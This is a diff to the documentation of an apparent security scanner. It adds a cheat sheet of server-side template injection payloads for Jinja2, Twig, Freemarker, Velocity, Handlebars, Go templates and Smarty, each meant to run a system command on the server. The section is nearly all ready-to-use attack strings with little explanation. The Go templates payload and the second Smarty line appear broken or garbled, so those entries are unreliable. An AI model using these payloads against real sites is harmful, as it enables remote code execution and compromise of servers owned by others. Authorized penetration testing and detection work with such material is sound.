@@ -650,3 +650,73 @@ findings with exploit proofs automatically.
 |---|---|
 | `sstiBlind` | blind server-side template injection oracle |
 | `rceClass` | command-injection / RCE class probes |
+
+---
+
+## Cheat Sheet — Per-Engine Payloads
+
+### Jinja2 (Python)
+
+```
+{{config}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{lipsum.__globals__['os'].popen('id').read()}}
+```
+
+### Twig (PHP)
+
+```
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+```
+
+### Freemarker (Java)
+
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+[#assign ex='freemarker.template.utility.Execute'?new()]${ex('id')}
+```
+
+### Velocity (Java)
+
+```
+#set($x="")#set($rt=$x.class.forName("java.lang.Runtime"))#set($chr=$x.class.forName("java.lang.Character"))#set($str=$x.class.forName("java.lang.String"))#set($ex=$rt.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+```
+
+### Handlebars (Node.js)
+
+```
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |cconslist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 cconslist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+### Go Templates
+
+```
+{{. | shell | return}}
+```
+
+### Smarty (PHP)
+
+```
+{system('id')}
+{Smarty_Internal_Write_File::writeFile($this->smarty->caching,$this->smarty->getInternalTemplateVars(),system('id'),self::clearCache)}
+```
